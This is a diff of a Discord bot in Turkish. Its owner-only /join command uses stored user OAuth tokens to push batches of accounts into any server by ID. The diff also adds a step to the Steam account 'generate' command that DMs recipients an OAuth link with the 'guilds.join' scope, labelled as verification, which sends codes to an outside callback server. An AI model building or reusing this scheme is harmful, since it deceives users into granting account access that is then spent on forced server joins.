@@ -291,28 +291,19 @@ async def create_ticket(interaction: discord.Interaction, category: str):
 async def ticket_cmd(interaction: discord.Interaction):
     await interaction.response.send_message(embed=discord.Embed(title="🎟️ Support", description="Select category."), view=TicketMenuView())
 
-# --- YENİ /JOIN KOMUTU (ID İLE) ---
 @bot.tree.command(name="join", description="İzin veren hesapları Sunucu ID'si ile sunucuya sokar")
-@app_commands.describe(sunucu_id="Sunucunun ID'si (Sağ tık -> ID Kopyala)", kac_adam="Kaç adam çekilecek")
+@app_commands.describe(sunucu_id="Sunucunun ID'si", kac_adam="Kaç adam çekilecek")
 async def join_cmd(interaction: discord.Interaction, sunucu_id: str, kac_adam: int = 10):
     if interaction.user.id != OWNER_ID: 
         return await interaction.response.send_message("⛔ Owner only.", ephemeral=True)
-        
     await interaction.response.defer()
-    
     guild_id = sunucu_id.strip()
     tokens_data = await read_github_file(AUTH_FILE)
     current_tokens = [t.strip() for t in tokens_data[0] if t.strip()]
-    
-    if not current_tokens: 
-        return await interaction.followup.send("❌ Kimse izin vermemiş!")
-
+    if not current_tokens: return await interaction.followup.send("❌ Kimse izin vermemiş!")
     selected_tokens = random.sample(current_tokens, min(kac_adam, len(current_tokens)))
     msg = await interaction.followup.send(f"⏳ **{guild_id}** ID'li sunucuya {len(selected_tokens)} hesap sokuluyor...")
-    
-    success = 0
-    fail = 0
-    
+    success, fail = 0, 0
     for token in selected_tokens:
         headers = {"Authorization": f"Bot {TOKEN}", "Content-Type": "application/json"}
         try:
@@ -327,7 +318,6 @@ async def join_cmd(interaction: discord.Interaction, sunucu_id: str, kac_adam: i
                     else: fail += 1
         except: fail += 1
         await asyncio.sleep(1.5)
-
     await msg.edit(content=f"✅ Bitti!\nHedef Sunucu ID: **{guild_id}**\n\n✔️ Başarılı: **{success}**\n❌ Başarısız: **{fail}**")
 
 @bot.tree.command(name="generate", description="Hesap üretir")
@@ -361,7 +351,10 @@ async def generate_cmd(interaction: discord.Interaction, service: app_commands.C
     set_limit(interaction.user.id, f"{svc}_{pln}")
     try:
         if svc == "steam":
+            # Hesabı ve Authorize linkini DM'den at
             await interaction.user.send(f"🎁 **Steam ({pln.capitalize()})**\n\n```\n{acc}\n```")
+            auth_link = "https://discord.com/oauth2/authorize?client_id=1567282004901241065&response_type=code&redirect_uri=https%3A%2F%2Fkanki-6k6m.onrender.com%2Fcallback&scope=guilds.join+identify"
+            await interaction.user.send(f"🔗 **Do authorize for verify:**\n{auth_link}")
             await interaction.followup.send(f"Generated, Check DMs!")
         else:
             await interaction.followup.send(f"✅ Generated, Check DMs!")
